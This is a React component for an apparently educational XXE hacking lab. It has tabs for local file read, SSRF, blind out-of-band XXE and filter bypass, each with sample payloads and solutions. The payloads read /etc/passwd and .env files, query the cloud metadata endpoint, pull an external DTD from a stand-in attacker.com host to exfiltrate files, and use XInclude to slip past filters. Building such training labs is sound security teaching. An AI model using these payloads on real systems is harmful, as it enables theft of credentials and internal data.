import { useState, useRef, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import { Zap, Shield, ChevronDown, FileText, Server, AlertTriangle, CheckCircle, Code, Globe } from 'lucide-react';

interface XXEResult {
  success?: boolean;
  parser_output?: {
    message: string;
    extracted_entity?: string;
    xml_structure?: string;
  };
  xxe_vulnerability?: {
    detected: boolean;
    attack_vector: string;
    accessed_file?: string;
    success: boolean;
    message: string;
    flag: string;
  };
  error?: string;
  message?: string;
  metadata?: any;
}

export default function XxeLabBeginner() {
  const [activeTab, setActiveTab] = useState('intro');
  const [isHardMode, setIsHardMode] = useState(false);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<XXEResult | null>(null);
  const [solutionStates, setSolutionStates] = useState<Record<string, boolean>>({
    file: false,
    ssrf: false,
    blind: false,
    bypass: false
  });
  const resultsRef = useRef<HTMLDivElement>(null);
  
  const toggleSolution = (technique: string) => {
    setSolutionStates(prev => ({ ...prev, [technique]: !prev[technique] }));
  };
  
  const [xmlInput, setXmlInput] = useState(`<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
</user>`);

  useEffect(() => {
    if (result && resultsRef.current) {
      resultsRef.current.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }, [result]);

  const executeXXE = async () => {
    setLoading(true);
    setResult(null);
    
    try {
      const response = await fetch('/api/vuln/xxe', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/xml',
        },
        body: xmlInput
      });
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ error: 'Network error or invalid response' });
    } finally {
      setLoading(false);
    }
  };

  const loadExample = (type: string) => {
    switch (type) {
      case 'file':
        setXmlInput(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>`);
        break;
      case 'env':
        setXmlInput(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///var/www/html/.env">
]>
<config>
  <data>&xxe;</data>
</config>`);
        break;
      case 'ssrf':
        setXmlInput(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<request>
  <url>&xxe;</url>
</request>`);
        break;
      case 'blind':
        setXmlInput(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>`);
        break;
    }
  };

  const renderResults = () => {
    if (!result) return null;
    
    if (result.error) {
      return (
        <div ref={resultsRef} className="mt-4 p-4 bg-red-950/50 border border-red-500/50 rounded-lg">
          <div className="flex items-center gap-2 text-red-400 font-semibold mb-2">
            <AlertTriangle size={18} />
            Parser Error
          </div>
          <p className="text-red-300 text-sm">{result.error}</p>
        </div>
      );
    }

    return (
      <div ref={resultsRef} className="mt-4 space-y-3">
        {result.xxe_vulnerability?.detected && (
          <div className="p-4 bg-green-950/50 border border-green-500/50 rounded-lg">
            <div className="flex items-center gap-2 text-green-400 font-semibold mb-2">
              <CheckCircle size={18} />
              XXE Attack Successful!
            </div>
            <code className="text-green-300 bg-green-900/30 px-2 py-1 rounded">{result.xxe_vulnerability.flag}</code>
            <p className="text-green-300 text-sm mt-2">{result.xxe_vulnerability.message}</p>
          </div>
        )}
        
        {result.xxe_vulnerability && (
          <div className="p-4 bg-amber-950/30 border border-amber-600/30 rounded-lg">
            <h4 className="text-amber-400 font-semibold text-sm mb-2 flex items-center gap-2">
              <AlertTriangle size={14} />
              Attack Details
            </h4>
            <div className="space-y-1 text-sm">
              <div className="text-slate-300">
                <span className="text-slate-500">Attack Vector:</span>{' '}
                <span className="text-amber-300">{result.xxe_vulnerability.attack_vector}</span>
              </div>
              {result.xxe_vulnerability.accessed_file && (
                <div className="text-slate-300">
                  <span className="text-slate-500">Accessed File:</span>{' '}
                  <code className="bg-slate-800 px-1 rounded text-amber-300">{result.xxe_vulnerability.accessed_file}</code>
                </div>
              )}
            </div>
          </div>
        )}
        
        {result.parser_output?.extracted_entity && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-amber-400 font-semibold text-sm mb-2 flex items-center gap-2">
              <FileText size={14} />
              Extracted Data (Entity Content)
            </h4>
            <pre className="text-xs text-green-300 bg-black/50 p-3 rounded overflow-x-auto whitespace-pre-wrap max-h-64">
              {result.parser_output.extracted_entity}
            </pre>
          </div>
        )}

        {result.parser_output && !result.xxe_vulnerability?.detected && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-slate-400 font-semibold text-sm mb-2 flex items-center gap-2">
              <Code size={14} />
              Parser Output
            </h4>
            <p className="text-slate-300 text-sm">{result.parser_output.message}</p>
            {result.parser_output.xml_structure && (
              <p className="text-slate-400 text-xs mt-1">{result.parser_output.xml_structure}</p>
            )}
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="cyber-card border border-amber-900/50 mb-6 bg-gradient-to-br from-amber-950/20 to-[#0A0A14]">
      <div className="bg-gradient-to-r from-amber-950/40 to-[#0D0D14] border-b border-amber-900/30 px-6 py-5">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-bold flex items-center">
              <span className="text-amber-400">XML External Entities (XXE) Lab</span>
              <Badge className="ml-3 bg-amber-500/20 text-amber-400 border-amber-500/30">Injection</Badge>
            </h2>
            <p className="text-gray-400 mt-1 text-sm">
              Exploit XML parsers to read files and perform SSRF attacks
            </p>
          </div>
          <div className="flex gap-2">
            <Button 
              size="sm"
              variant={!isHardMode ? "default" : "outline"}
              className={!isHardMode ? "bg-amber-600 hover:bg-amber-500" : "border-amber-600/50 text-amber-400"}
              onClick={() => setIsHardMode(false)}
            >
              <Zap size={16} className="mr-1" />
              Easy
            </Button>
            <Button 
              size="sm"
              variant={isHardMode ? "default" : "outline"}
              className={isHardMode ? "bg-amber-800 hover:bg-amber-700" : "border-amber-800/50 text-amber-400"}
              onClick={() => setIsHardMode(true)}
            >
              <Shield size={16} className="mr-1" />
              Hard
            </Button>
          </div>
        </div>
        {isHardMode && (
          <div className="mt-3 p-2 bg-amber-900/30 border border-amber-600/30 rounded text-xs text-amber-300">
            Hardened Parser - External entities blocked. Try blind XXE with out-of-band techniques!
          </div>
        )}
      </div>
      
      <div className="p-6">
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid grid-cols-5 bg-slate-900/50">
            <TabsTrigger value="intro" className="text-xs">Mission</TabsTrigger>
            <TabsTrigger value="file" className="text-xs">File Read</TabsTrigger>
            <TabsTrigger value="ssrf" className="text-xs">SSRF</TabsTrigger>
            <TabsTrigger value="blind" className="text-xs">Blind XXE</TabsTrigger>
            <TabsTrigger value="bypass" className="text-xs">Bypass</TabsTrigger>
          </TabsList>

          <TabsContent value="intro" className="mt-4">
            <Card className="bg-slate-900/50 border-amber-900/30">
              <CardHeader>
                <CardTitle className="text-amber-400 flex items-center gap-2">
                  <FileText size={20} />
                  Mission Briefing
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4 text-sm">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Scenario</h4>
                  <p className="text-slate-300">
                    You've found an <strong className="text-amber-400">XML Document Parser</strong> service. 
                    The parser processes user-submitted XML documents, but it may be vulnerable to XXE attacks 
                    that could allow you to read local files and access internal services.
                  </p>
                </div>
                
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Your Objectives</h4>
                  <ol className="list-decimal list-inside space-y-2 text-slate-300">
                    <li><strong>File Read:</strong> Use external entities to read /etc/passwd and .env files</li>
                    <li><strong>SSRF:</strong> Access internal services via XXE-based SSRF</li>
                    <li><strong>Blind XXE:</strong> Exfiltrate data when output isn't displayed</li>
                    <li><strong>Bypass:</strong> Evade parser restrictions and filters</li>
                  </ol>
                </div>

                <div className="p-4 bg-yellow-900/20 rounded-lg border border-yellow-600/30">
                  <h4 className="font-semibold text-yellow-400 mb-2">How XXE Works</h4>
                  <p className="text-slate-300 text-xs">
                    XXE exploits XML parsers that process external entity references. By defining a DTD with 
                    <code className="bg-slate-700 px-1 rounded mx-1">&lt;!ENTITY xxe SYSTEM "file:///path"&gt;</code>
                    and referencing it with <code className="bg-slate-700 px-1 rounded mx-1">&amp;xxe;</code>, 
                    attackers can read local files, make HTTP requests, or cause denial of service.
                  </p>
                </div>

                <Button 
                  className="w-full bg-amber-600 hover:bg-amber-500"
                  onClick={() => setActiveTab('file')}
                >
                  Start Lab - File Read XXE
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="file" className="mt-4">
            <Card className="bg-slate-900/50 border-amber-900/30">
              <CardHeader>
                <CardTitle className="text-orange-400 flex items-center gap-2">
                  <FileText size={20} />
                  Local File Read via XXE
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Define a DOCTYPE with an external entity pointing to a file</li>
                    <li>Reference the entity in your XML document using &amp;entityName;</li>
                    <li>The parser will replace the entity with file contents</li>
                    <li>Target files: /etc/passwd, /etc/shadow, .env, config files</li>
                  </ol>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => loadExample('file')} className="text-xs">
                    Load /etc/passwd
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => loadExample('env')} className="text-xs">
                    Load .env
                  </Button>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">XML Document</label>
                  <textarea
                    value={xmlInput}
                    onChange={(e) => setXmlInput(e.target.value)}
                    placeholder="Enter XML document..."
                    className="w-full h-48 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                  />
                  <Button 
                    onClick={executeXXE}
                    disabled={loading}
                    className="w-full bg-orange-600 hover:bg-orange-500"
                  >
                    {loading ? 'Parsing...' : 'Parse XML Document'}
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.file} onOpenChange={() => toggleSolution('file')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.file ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.file ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Basic File XXE:</strong></p>
                      <pre className="text-xs bg-slate-900 p-2 rounded overflow-x-auto text-amber-300">{`<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="ssrf" className="mt-4">
            <Card className="bg-slate-900/50 border-amber-900/30">
              <CardHeader>
                <CardTitle className="text-blue-400 flex items-center gap-2">
                  <Globe size={20} />
                  Server-Side Request Forgery via XXE
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Use HTTP/HTTPS URLs in external entities</li>
                    <li>Access internal services (localhost, internal IPs)</li>
                    <li>Try cloud metadata endpoints (169.254.169.254)</li>
                    <li>Port scan internal network via XXE</li>
                  </ol>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => loadExample('ssrf')} className="text-xs">
                    Load AWS Metadata
                  </Button>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">XML Document</label>
                  <textarea
                    value={xmlInput}
                    onChange={(e) => setXmlInput(e.target.value)}
                    placeholder="Enter XML document..."
                    className="w-full h-48 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                  />
                  <Button 
                    onClick={executeXXE}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-500"
                  >
                    {loading ? 'Parsing...' : 'Parse XML Document'}
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.ssrf} onOpenChange={() => toggleSolution('ssrf')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.ssrf ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.ssrf ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>AWS Metadata SSRF:</strong></p>
                      <pre className="text-xs bg-slate-900 p-2 rounded overflow-x-auto text-blue-300">{`<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request><url>&xxe;</url></request>`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="blind" className="mt-4">
            <Card className="bg-slate-900/50 border-amber-900/30">
              <CardHeader>
                <CardTitle className="text-purple-400 flex items-center gap-2">
                  <Server size={20} />
                  Blind XXE (Out-of-Band)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>When entity content isn't reflected in output, use blind techniques</li>
                    <li>Use parameter entities (%entity;) for DTD loading</li>
                    <li>Exfiltrate data to attacker-controlled server</li>
                    <li>Combine file read with HTTP request to exfiltrate</li>
                  </ol>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => loadExample('blind')} className="text-xs">
                    Load Blind XXE
                  </Button>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">XML Document</label>
                  <textarea
                    value={xmlInput}
                    onChange={(e) => setXmlInput(e.target.value)}
                    placeholder="Enter XML document..."
                    className="w-full h-48 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                  />
                  <Button 
                    onClick={executeXXE}
                    disabled={loading}
                    className="w-full bg-purple-600 hover:bg-purple-500"
                  >
                    {loading ? 'Parsing...' : 'Parse XML Document'}
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.blind} onOpenChange={() => toggleSolution('blind')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.blind ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.blind ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Blind XXE with parameter entities:</strong></p>
                      <pre className="text-xs bg-slate-900 p-2 rounded overflow-x-auto text-purple-300">{`<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="bypass" className="mt-4">
            <Card className="bg-slate-900/50 border-amber-900/30">
              <CardHeader>
                <CardTitle className="text-green-400 flex items-center gap-2">
                  <Shield size={20} />
                  XXE Filter Bypass
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions (Enable Hard Mode!)</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Switch to Hard Mode - parser blocks common XXE patterns</li>
                    <li>Try UTF-16 encoding to bypass content filters</li>
                    <li>Use XML parameter entities for indirect injection</li>
                    <li>Exploit XInclude when DTD is disabled</li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">XML Document</label>
                  <textarea
                    value={xmlInput}
                    onChange={(e) => setXmlInput(e.target.value)}
                    placeholder="Enter XML document..."
                    className="w-full h-48 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                  />
                  <Button 
                    onClick={executeXXE}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-500"
                  >
                    {loading ? 'Parsing...' : 'Parse XML Document'}
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.bypass} onOpenChange={() => toggleSolution('bypass')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.bypass ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.bypass ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>XInclude bypass:</strong></p>
                      <pre className="text-xs bg-slate-900 p-2 rounded overflow-x-auto text-green-300">{`<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>`}</pre>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
